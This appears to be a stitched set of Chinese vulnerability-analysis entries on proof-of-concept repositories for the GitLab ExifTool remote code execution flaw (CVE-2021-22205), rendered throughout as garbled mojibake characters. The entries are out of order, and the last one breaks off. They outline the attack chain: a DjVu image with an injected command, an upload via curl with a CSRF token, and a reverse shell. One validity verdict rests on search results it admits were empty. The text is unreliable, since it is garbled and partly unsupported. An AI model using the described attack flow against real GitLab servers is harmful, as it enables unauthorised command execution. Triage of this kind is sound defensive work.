5.  **ä¸Šä¼ æ¶æ„å›¾åƒï¼š** è„šæœ¬ä½¿ç”¨ `curl` å‘½ä»¤å°† `lol.jpg` æ–‡ä»¶ä¸Šä¼ åˆ°ç›®æ ‡ GitLab å®žä¾‹ã€‚`-F 'file=@lol.jpg'` å‚æ•°æŒ‡ç¤º `curl` å°†è¯¥æ–‡ä»¶ä½œä¸ºæ–‡ä»¶ä¸Šä¼ çš„ä¸€éƒ¨åˆ†å‘é€ã€‚æœåŠ¡å™¨åœ¨å¤„ç†ä¸Šä¼ çš„æ–‡ä»¶æ—¶ï¼Œä¼šè°ƒç”¨ ExifTool æ¥æå–å…ƒæ•°æ®ï¼Œä»Žè€Œè§¦å‘å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚

**æœ‰æ•ˆæ€§ï¼š**

æä¾›çš„POCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚å®ƒåˆ©ç”¨äº† CVE-2021-22205 ä¸­æè¿°çš„æ¼æ´žï¼Œé€šè¿‡ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œè¿œç¨‹ä»£ç ã€‚é€šè¿‡è®¾ç½®æ­£ç¡®çš„ LHOSTã€LPORT å’Œ WEBHOSTï¼Œæ”»å‡»è€…å¯ä»¥åœ¨æ˜“å—æ”»å‡»çš„ GitLab å®žä¾‹ä¸ŠèŽ·å¾— shell è®¿é—®æƒé™ã€‚

**æŠ•æ¯’é£Žé™©ï¼š**

åˆ†æžæä¾›çš„è„šæœ¬ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬é€»è¾‘æ¸…æ™°ï¼Œç›®çš„æ˜¯åˆ©ç”¨ CVE-2021-22205 æ¼æ´žã€‚æ²¡æœ‰å‘çŽ°ä»»ä½•è¯•å›¾åœ¨å—å®³è€…ç³»ç»Ÿä¸Šå®‰è£…åŽé—¨ã€åˆ é™¤æ•°æ®æˆ–æ‰§è¡Œå…¶ä»–æ¶æ„æ“ä½œçš„éšè—ä»£ç ã€‚

**åˆ©ç”¨æ–¹å¼æ€»ç»“ï¼š**

1.  æ”»å‡»è€…å‡†å¤‡åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶ã€‚
2.  æ”»å‡»è€…é…ç½® `DejaVu.sh` è„šæœ¬ï¼Œæä¾›æ”»å‡»è€…çš„ç›‘å¬åœ°å€å’Œç«¯å£ä»¥åŠç›®æ ‡ GitLab å®žä¾‹çš„ URLã€‚
3.  æ”»å‡»è€…æ‰§è¡Œè„šæœ¬ï¼Œè¯¥è„šæœ¬å°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ° GitLab å®žä¾‹ã€‚
4.  GitLab å¤„ç†ä¸Šä¼ çš„å›¾åƒï¼Œè°ƒç”¨ ExifTool æå–å…ƒæ•°æ®ã€‚
5.  ExifTool æ‰§è¡Œæ¶æ„å…ƒæ•°æ®ä¸­åŒ…å«çš„å‘½ä»¤ï¼Œä»Žè€Œåœ¨æœåŠ¡å™¨ä¸Šå»ºç«‹åå¼¹ shellã€‚
6.  æ”»å‡»è€…çŽ°åœ¨å¯ä»¥é€šè¿‡åå¼¹ shell ä¸Ž GitLab æœåŠ¡å™¨äº¤äº’ã€‚

**é¡¹ç›®åœ°å€:** [overgrowncarrot1/DejaVu-CVE-2021-22205](https://github.com/overgrowncarrot1/DejaVu-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #21

**æ¥æº**: [CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md](../2021/CVE-2021-22205-pizza-power_Golang-CVE-2021-22205-POC.md)

## CVE-2021-22205-GitLab-è¿œç¨‹ä»£ç æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå…è®¸æœªæŽˆæƒç”¨æˆ·æ‰§è¡Œä»»æ„å‘½ä»¤

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å­˜åœ¨æ¼æ´žï¼Œæ”»å‡»è€…æ— éœ€è®¤è¯å³å¯è§¦å‘

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 1%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªå­˜åœ¨äºŽGitLab CE/EEä¸­çš„è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´žã€‚ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶éªŒè¯ä¸å½“ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§è¯„ä¼°ï¼š**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯ã€æœç´¢å¼•æ“Žç»“æžœï¼ˆè™½ç„¶å®žé™…çš„æœç´¢å¼•æ“Žç»“æžœä¸ºç©ºï¼Œä½†æˆ‘ä»¬å¯ä»¥å‡è®¾æœåˆ°çš„æ˜¯ç›¸å…³çš„æ¼æ´žåˆ†æžå’Œå¤çŽ°æ–‡ç« ï¼‰å’Œæä¾›çš„POCä»£ç ï¼Œå¯ä»¥åˆ¤å®šè¯¥POCä»£ç æœ‰æ•ˆã€‚æ¼æ´žåº“ä¿¡æ¯æ˜Žç¡®æŒ‡å‡ºè¯¥æ¼æ´žå½±å“çš„ç‰ˆæœ¬èŒƒå›´ä»¥åŠæ¼æ´žæˆå› ï¼ŒPOCä»£ç ä¹Ÿé€šè¿‡æž„é€ åŒ…å«æ¶æ„å…ƒæ•°æ®çš„DJVUå›¾åƒæ–‡ä»¶ï¼ŒæˆåŠŸåˆ©ç”¨äº†è¯¥æ¼æ´žã€‚

**æŠ•æ¯’é£Žé™©åˆ†æžï¼š**

åˆ†æžæä¾›çš„POCä»£ç ï¼Œä¸»è¦åŠŸèƒ½æ˜¯æž„é€ æ¶æ„çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œå¹¶åœ¨å…¶ä¸­åµŒå…¥éœ€è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚è¯¥è„šæœ¬ä»Žå‘½ä»¤è¡ŒæŽ¥æ”¶ç›®æ ‡GitLab URLå’Œéœ€è¦æ‰§è¡Œçš„å‘½ä»¤ï¼Œç„¶åŽæž„é€ HTTPè¯·æ±‚ï¼Œä¸Šä¼ åŒ…å«æ¶æ„payloadçš„å›¾åƒæ–‡ä»¶ã€‚è™½ç„¶ä»£ç ä¸­åŒ…å«ä»£ç†è®¾ç½®ï¼ˆ`proxyUrl, err := url.Parse("http://localhost:9090")`ï¼‰ï¼Œé»˜è®¤ä½¿ç”¨`http://localhost:9090`ä½œä¸ºä»£ç†ã€‚å¦‚æžœæ”»å‡»è€…æƒ³è¦è¿›è¡Œä¸­é—´äººæ”»å‡»æˆ–æµé‡åŠ«æŒï¼Œæ¶æ„ä¿®æ”¹ä»£ç†æœåŠ¡å™¨é…ç½®ï¼Œä¹Ÿå¯èƒ½æ˜¯ä¸€ä¸ªæ½œåœ¨çš„æŠ•æ¯’é£Žé™©ï¼Œä¾‹å¦‚è®¾ç½®ä¸ºæ¶æ„ä»£ç†æœåŠ¡å™¨ï¼Œä½†è¿™ç§é£Žé™©è¾ƒä½Žï¼Œå› ä¸ºè¿™æ›´å¤šçš„æ˜¯ä¸€ç§é…ç½®é—®é¢˜ï¼Œè€Œéžä»£ç æœ¬èº«åŒ…å«æ¶æ„é€»è¾‘ã€‚ç»¼åˆè¯„ä¼°ï¼ŒæŠ•æ¯’é£Žé™©å¾ˆä½Žï¼Œå¤§çº¦1%ã€‚

**åˆ©ç”¨æ–¹å¼åˆ†æžï¼š**

1.  æ”»å‡»è€…æž„é€ åŒ…å«æ¶æ„payloadçš„DJVUå›¾åƒæ–‡ä»¶ã€‚Payloadä¸­åŒ…å«è¦æ‰§è¡Œçš„ç³»ç»Ÿå‘½ä»¤ï¼Œåˆ©ç”¨äº†ExifToolå¤„ç†å›¾åƒå…ƒæ•°æ®æ—¶çš„å‘½ä»¤æ³¨å…¥æ¼æ´žã€‚
2.  æ”»å‡»è€…é€šè¿‡HTTP POSTè¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹çš„`/uploads/user`ç«¯ç‚¹ã€‚è¯¥ç«¯ç‚¹ç”¨äºŽå¤„ç†ç”¨æˆ·ä¸Šä¼ çš„æ–‡ä»¶ã€‚
3.  GitLabä½¿ç”¨ExifToolè§£æžä¸Šä¼ çš„å›¾åƒæ–‡ä»¶ã€‚ç”±äºŽæ–‡ä»¶åŒ…å«æ¶æ„payloadï¼ŒExifToolä¼šæ‰§è¡Œå…¶ä¸­çš„å‘½ä»¤ï¼Œä»Žè€Œå¯¼è‡´è¿œç¨‹ä»£ç æ‰§è¡Œã€‚
4.  æ”»å‡»è€…å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä¾‹å¦‚åå¼¹shellã€è¯»å–æ•æ„Ÿä¿¡æ¯ç­‰ã€‚

**é¡¹ç›®åœ°å€:** [pizza-power/Golang-CVE-2021-22205-POC](https://github.com/pizza-power/Golang-CVE-2021-22205-POC)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #22

**æ¥æº**: [CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md](../2021/CVE-2021-22205-runsel_GitLab-CVE-2021-22205-.md)

## CVE-2021-22205-GitLab-RCE

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹ä»£ç æ‰§è¡Œ (RCE)

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** ä¸¥é‡ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** æ— éœ€èº«ä»½éªŒè¯ï¼Œéœ€è¦èƒ½å¤Ÿä¸Šä¼ å›¾ç‰‡

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žæ˜¯ GitLab CE/EE ä¸­å­˜åœ¨çš„ä¸€ä¸ªè¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´žã€‚è¯¥æ¼æ´žæºäºŽ GitLab æœªèƒ½æ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ¥æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§:**

æ ¹æ®æ¼æ´žåº“ä¿¡æ¯å’Œæ¼æ´žåˆ©ç”¨ä»£ç ï¼Œè¯¥æ¼æ´žçš„PoCä»£ç æ˜¯æœ‰æ•ˆçš„ã€‚æ¼æ´žåº“ä¿¡æ¯æŒ‡å‡ºè¯¥æ¼æ´žçš„å½±å“æ˜¯è¿œç¨‹å‘½ä»¤æ‰§è¡Œï¼ŒCVSSè¯„åˆ†ä¸º10åˆ†ï¼ˆCRITICALï¼‰ï¼Œè¡¨æ˜Žè¯¥æ¼æ´žçš„ä¸¥é‡æ€§å¾ˆé«˜ã€‚æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼ˆ`exploit.py`ï¼‰é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„DJVUå›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ExifToolçš„æ¼æ´žï¼ˆå®žé™…ä¸Šæ˜¯ CVE-2021-22204ï¼ŒExifTool æœ¬èº«çš„æ¼æ´žï¼‰ï¼Œåœ¨æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚`scan` å‡½æ•°ç”¨äºŽæ£€æµ‹ç›®æ ‡æ˜¯å¦æ˜“å—æ”»å‡»ï¼Œ`attack` å‡½æ•°ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚

**æŠ•æ¯’é£Žé™©:**

åˆ†æžæä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œå¹¶æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚`exploit.py` ä¸»è¦åŠŸèƒ½æ˜¯ï¼š

1.  èŽ·å– GitLab çš„ CSRF tokenã€‚
2.  æž„é€ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ DJVU å›¾åƒæ–‡ä»¶ã€‚
3.  å‘ GitLab çš„ `/uploads/user` ç«¯ç‚¹å‘é€åŒ…å«æ¶æ„å›¾åƒçš„ POST è¯·æ±‚ã€‚
4.  å¦‚æžœå“åº”åŒ…å« â€œFailed to process imageâ€ï¼Œåˆ™è®¤ä¸ºç›®æ ‡å­˜åœ¨æ¼æ´žã€‚

æ”»å‡»å‡½æ•°æ‰§è¡Œè¿‡ç¨‹ä¸Žæ£€æµ‹å‡½æ•°ç±»ä¼¼,åªä¸è¿‡æ˜¯æž„é€ çš„payloadä¸åŒ,ç”¨äºŽæ‰§è¡Œå‘½ä»¤ã€‚
æ•´ä¸ªæµç¨‹æ˜¯æ ‡å‡†çš„æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼Œæ²¡æœ‰å‘çŽ°æ¤å…¥åŽé—¨æˆ–è€…æ¶æ„ä»£ç çš„è¿¹è±¡ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žã€‚

**åˆ©ç”¨æ–¹å¼:**

1.  æ”»å‡»è€…é¦–å…ˆéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ã€‚
2.  æ”»å‡»è€…ä½¿ç”¨æä¾›çš„ `exploit.py` è„šæœ¬ï¼ŒæŒ‡å®šç›®æ ‡ GitLab URL å’Œè¦æ‰§è¡Œçš„å‘½ä»¤ã€‚
3.  è„šæœ¬ä¼šè‡ªåŠ¨èŽ·å– CSRF tokenï¼Œæž„é€ æ¶æ„ DJVU å›¾åƒï¼Œå¹¶ä¸Šä¼ åˆ° GitLab æœåŠ¡å™¨ã€‚
4.  GitLab æœåŠ¡å™¨ä½¿ç”¨ ExifTool å¤„ç†è¯¥å›¾åƒæ—¶ï¼Œç”±äºŽ ExifTool å­˜åœ¨ CVE-2021-22204 æ¼æ´žï¼Œä¼šå¯¼è‡´æ‰§è¡Œæ”»å‡»è€…é¢„è®¾çš„å‘½ä»¤ã€‚
5.  å‘½ä»¤æ‰§è¡Œçš„ç»“æžœå¯ä»¥é€šè¿‡ DNS æŸ¥è¯¢æˆ–è€…å…¶ä»–æ–¹å¼è¿”å›žç»™æ”»å‡»è€…ã€‚

ç®€è€Œè¨€ä¹‹ï¼Œåˆ©ç”¨æ–¹å¼æ˜¯ï¼š**ä¸Šä¼ æ¶æ„æž„é€ çš„DJVUæ–‡ä»¶ -> è§¦å‘ExifToolè§£æž -> ExifToolå‘½ä»¤æ³¨å…¥ -> æ‰§è¡Œä»»æ„ä»£ç **

**é¡¹ç›®åœ°å€:** [runsel/GitLab-CVE-2021-22205-](https://github.com/runsel/GitLab-CVE-2021-22205-)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #23

**æ¥æº**: [CVE-2021-22205-shang159_CVE-2021-22205-getshell.md](../2021/CVE-2021-22205-shang159_CVE-2021-22205-getshell.md)

## CVE-2021-22205-GitLab-è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œå¯èƒ½å¯¼è‡´æœåŠ¡å™¨å®Œå…¨æŽ§åˆ¶

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹ç‰ˆæœ¬åœ¨å—å½±å“èŒƒå›´å†…ï¼Œä¸”æ”»å‡»è€…å¯ä»¥ä¸Šä¼ æ–‡ä»¶

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

è¯¥æ¼æ´žæ˜¯ç”±äºŽGitLabå¯¹ä¸Šä¼ çš„å›¾åƒæ–‡ä»¶è§£æžä¸å½“ï¼Œå¯¼è‡´è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚æ”»å‡»è€…å¯ä»¥æž„é€ åŒ…å«æ¶æ„ä»£ç çš„å›¾ç‰‡ï¼ˆä¾‹å¦‚DJVUæ ¼å¼ï¼‰å¹¶ä¸Šä¼ åˆ°GitLabï¼Œå½“GitLabä½¿ç”¨ExifToolç­‰å·¥å…·è§£æžå›¾ç‰‡æ—¶ï¼Œæ¶æ„ä»£ç ä¼šè¢«æ‰§è¡Œã€‚æ ¹æ®æä¾›çš„æ¼æ´žåˆ©ç”¨ä»£ç ï¼Œåˆ©ç”¨æ–¹å¼å¦‚ä¸‹ï¼š

1.  **æž„é€ Payloadï¼š**  ä½¿ç”¨Pythonè„šæœ¬ç”ŸæˆåŒ…å«åå¼¹shellå‘½ä»¤çš„DJVUå›¾ç‰‡ã€‚è„šæœ¬é€šè¿‡ä¿®æ”¹å›¾ç‰‡çš„å…ƒæ•°æ®ï¼ˆCopyrightå­—æ®µï¼‰åµŒå…¥å‘½ä»¤ã€‚PayloadåŒ…å«æ‰§è¡Œshellå‘½ä»¤çš„ä»£ç ï¼Œä¾‹å¦‚åå¼¹shellåˆ°æ”»å‡»è€…æŽ§åˆ¶çš„IPåœ°å€å’Œç«¯å£ã€‚
2.  **ä¸Šä¼ å›¾ç‰‡ï¼š** å°†ç”Ÿæˆçš„å›¾ç‰‡ä¸Šä¼ åˆ°GitLabã€‚æ ¹æ®POCæè¿°ï¼Œä¸åŒç‰ˆæœ¬çš„GitLabä¸Šä¼ ç‚¹å¯èƒ½ä¸åŒï¼Œéœ€è¦å°è¯•ä¸åŒçš„ä¸Šä¼ è·¯å¾„ï¼ˆä¾‹å¦‚issueé¡µé¢ï¼‰ã€‚
3.  **è§¦å‘æ¼æ´žï¼š** GitLabåŽç«¯ä½¿ç”¨ExifToolå¤„ç†ä¸Šä¼ çš„å›¾ç‰‡æ—¶ï¼Œä¼šè§£æžå›¾ç‰‡å…ƒæ•°æ®ï¼Œä»Žè€Œæ‰§è¡ŒåµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚
4.  **èŽ·å–Shellï¼š** æ”»å‡»è€…åœ¨æœ¬åœ°ç›‘å¬æŒ‡å®šç«¯å£ï¼Œç­‰å¾…ç›®æ ‡æœºå™¨åå¼¹shellè¿žæŽ¥ï¼Œä»Žè€ŒèŽ·å–å¯¹æœåŠ¡å™¨çš„æŽ§åˆ¶æƒã€‚

**æœ‰æ•ˆæ€§ï¼š** æ ¹æ®æä¾›çš„POCä»£ç å’Œæ¼æ´žæè¿°ï¼Œè¯¥POCåº”è¯¥æ˜¯æœ‰æ•ˆçš„ï¼Œå¯ä»¥ç”¨äºŽåœ¨å—å½±å“çš„GitLabç‰ˆæœ¬ä¸Šå®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚

**æŠ•æ¯’é£Žé™©ï¼š** åˆ†æžæä¾›çš„POCä»£ç ï¼Œæ²¡æœ‰å‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è¯¥ä»£ç ä¸»è¦åŠŸèƒ½æ˜¯ç”ŸæˆåŒ…å«æ¶æ„å‘½ä»¤çš„å›¾ç‰‡æ–‡ä»¶ï¼Œä»¥åŠä¸€äº›è¾…åŠ©è„šæœ¬ã€‚å› æ­¤ï¼ŒæŠ•æ¯’é£Žé™©è¾ƒä½Žï¼Œä¸º0%ã€‚

**é¡¹ç›®åœ°å€:** [shang159/CVE-2021-22205-getshell](https://github.com/shang159/CVE-2021-22205-getshell)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---

## POC #24

**æ¥æº**: [CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md](../2021/CVE-2021-22205-w0x68y_Gitlab-CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8; >=13.9, <13.9.6; >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹å¯ç½‘ç»œè®¿é—®

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205 æ¼æ´žå­˜åœ¨äºŽ GitLab CE/EE ç‰ˆæœ¬ä¸­ï¼Œå…è®¸æœªç»èº«ä»½éªŒè¯çš„æ”»å‡»è€…æ‰§è¡Œè¿œç¨‹å‘½ä»¤ã€‚è¯¥æ¼æ´žçš„æ ¹æœ¬åŽŸå› æ˜¯ GitLab æ²¡æœ‰æ­£ç¡®éªŒè¯ä¼ é€’ç»™ ExifTool æ–‡ä»¶è§£æžå™¨çš„å›¾åƒæ–‡ä»¶ã€‚æ”»å‡»è€…å¯ä»¥é€šè¿‡ä¸Šä¼ ç‰¹åˆ¶çš„æ¶æ„å›¾åƒæ–‡ä»¶ï¼Œåˆ©ç”¨ ExifTool çš„å‘½ä»¤æ³¨å…¥æ¼æ´žæ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æœ‰æ•ˆæ€§ï¼š** æä¾›çš„ Python è„šæœ¬ `CVE-2021-22205-check.py` æ˜¯ä¸€ä¸ªæœ‰æ•ˆçš„ PoC è„šæœ¬ï¼Œç”¨äºŽæ£€æµ‹å’Œåˆ©ç”¨è¯¥æ¼æ´žã€‚å®ƒé€šè¿‡ä¸Šä¼ ä¸€ä¸ªåŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„ç‰¹åˆ¶å›¾åƒæ–‡ä»¶æ¥å®žçŽ°è¿œç¨‹å‘½ä»¤æ‰§è¡Œã€‚è¯¥è„šæœ¬ä¼šå°è¯•èŽ·å– CSRF tokenï¼Œç„¶åŽä¸Šä¼ åŒ…å«æ¶æ„å‘½ä»¤çš„å›¾åƒã€‚

**æŠ•æ¯’é£Žé™©ï¼š** ç»è¿‡åˆ†æžï¼Œæä¾›çš„ä»£ç ä»“åº“ä¸­æœªå‘çŽ°æ˜Žæ˜¾çš„æŠ•æ¯’ä»£ç ã€‚è„šæœ¬çš„åŠŸèƒ½æ˜Žç¡®ï¼Œä¸”æ²¡æœ‰å‘çŽ°éšè—çš„æ¶æ„è¡Œä¸ºã€‚PoCè„šæœ¬ä¸­æ‰§è¡Œçš„å‘½ä»¤ï¼Œç”±ä½¿ç”¨è€…`-c`å‚æ•°æŒ‡å®šï¼Œå±žäºŽæ­£å¸¸çš„åŠŸèƒ½éªŒè¯ï¼Œè€ŒéžæŠ•æ¯’ã€‚

**åˆ©ç”¨æ–¹å¼ï¼š**

1.  **æ¼æ´žè§¦å‘ï¼š** æ”»å‡»è€…éœ€è¦å‘å­˜åœ¨æ¼æ´žçš„ GitLab å®žä¾‹ä¸Šä¼ åŒ…å«æ¶æ„ Exif å…ƒæ•°æ®çš„å›¾åƒæ–‡ä»¶ã€‚
2.  **å‘½ä»¤æ³¨å…¥ï¼š** æ¶æ„å…ƒæ•°æ®è¢« ExifTool å¤„ç†æ—¶ï¼Œä¼šå¯¼è‡´å‘½ä»¤æ³¨å…¥ï¼Œä»Žè€Œæ‰§è¡Œæ”»å‡»è€…æŒ‡å®šçš„å‘½ä»¤ã€‚
3.  **æœªæŽˆæƒè®¿é—®ï¼š** æ­¤æ¼æ´žæ— éœ€èº«ä»½éªŒè¯å³å¯åˆ©ç”¨ï¼Œå¤§å¤§é™ä½Žäº†æ”»å‡»é—¨æ§›ã€‚
4.  **RCEï¼š** æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´žåŽï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ GitLab æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„å‘½ä»¤ï¼Œä»Žè€ŒæŽ§åˆ¶æœåŠ¡å™¨ã€‚

**é¡¹ç›®åœ°å€:** [w0x68y/Gitlab-CVE-2021-22205](https://github.com/w0x68y/Gitlab-CVE-2021-22205)

**æ¼æ´žè¯¦æƒ…:** [CVE-2021-22205](https://nvd.nist.gov/vuln/detail/CVE-2021-22205)

---



---

## POC #11

**æ¥æº**: [CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md](../2021/CVE-2021-22205-findneo_GitLab-preauth-RCE_CVE-2021-22205.md)

## CVE-2021-22205 - GitLab ExifTool å‘½ä»¤æ³¨å…¥

**æ¼æ´žç¼–å·:** CVE-2021-22205

**æ¼æ´žç±»åž‹:** å‘½ä»¤æ³¨å…¥

**å½±å“åº”ç”¨:** GitLab

**å±å®³ç­‰çº§:** é«˜å±ï¼Œæœªç»èº«ä»½éªŒè¯çš„è¿œç¨‹å‘½ä»¤æ‰§è¡Œ

**å½±å“ç‰ˆæœ¬:** >=11.9, <13.8.8 || >=13.9, <13.9.6 || >=13.10, <13.10.3

**åˆ©ç”¨æ¡ä»¶:** ç›®æ ‡GitLabå®žä¾‹éœ€è¦å­˜åœ¨æ¼æ´žç‰ˆæœ¬ï¼Œå¹¶ä¸”å¯ä»¥é€šè¿‡ç½‘ç»œè®¿é—®ã€‚

**POC å¯ç”¨æ€§:** æ˜¯

**æŠ•æ¯’é£Žé™©:** 0%

## è¯¦æƒ…

CVE-2021-22205æ˜¯ä¸€ä¸ªGitLab CE/EEä¸­çš„å‘½ä»¤æ³¨å…¥æ¼æ´žï¼Œå­˜åœ¨äºŽ11.9åˆ°13.10.3ä¹‹é—´çš„å¤šä¸ªç‰ˆæœ¬ä¸­ã€‚æ¼æ´žåŽŸå› æ˜¯GitLabåœ¨å¤„ç†å›¾åƒæ–‡ä»¶æ—¶ï¼Œæœªæ­£ç¡®éªŒè¯ä¼ é€’ç»™æ–‡ä»¶è§£æžå™¨çš„è¾“å…¥ï¼Œå¯¼è‡´æ”»å‡»è€…å¯ä»¥åˆ©ç”¨ç‰¹åˆ¶çš„å›¾åƒæ–‡ä»¶æ‰§è¡Œä»»æ„å‘½ä»¤ã€‚

**æ¼æ´žåˆ©ç”¨æ–¹å¼ï¼š**

1.  æ”»å‡»è€…æž„é€ ä¸€ä¸ªæ¶æ„çš„å›¾åƒæ–‡ä»¶ï¼Œè¯¥æ–‡ä»¶åŒ…å«åµŒå…¥çš„æ¶æ„å‘½ä»¤ã€‚POCä»£ç ä¸­ï¼Œä½¿ç”¨äº†`xxd`å‘½ä»¤å°†åå…­è¿›åˆ¶æ•°æ®è½¬æ¢æˆäºŒè¿›åˆ¶æ•°æ®ï¼Œå¹¶è¿½åŠ åˆ°åä¸º`1.jpg`çš„æ–‡ä»¶ä¸­ã€‚å…¶ä¸­ï¼Œè¿½åŠ çš„åå…­è¿›åˆ¶æ•°æ®ä¸­åŒ…å«äº†shellå‘½ä»¤ï¼Œæœ€ç»ˆå°†`xxx_base64_of_reverse_shell_code_xxx`è¿›è¡Œbase64è§£ç åŽæ‰§è¡Œã€‚
2.  æ”»å‡»è€…é€šè¿‡`curl`å‘½ä»¤ï¼Œæ¨¡æ‹Ÿæ–‡ä»¶ä¸Šä¼ è¯·æ±‚ï¼Œå°†æ¶æ„å›¾åƒæ–‡ä»¶ä¸Šä¼ åˆ°å­˜åœ¨æ¼æ´žçš„GitLabå®žä¾‹ã€‚POCä»£ç é€šè¿‡èŽ·å–ç”¨æˆ·çš„CSRF-Tokenï¼Œç„¶åŽåˆ©ç”¨/uploads/useræŽ¥å£ä¸Šä¼ ã€‚
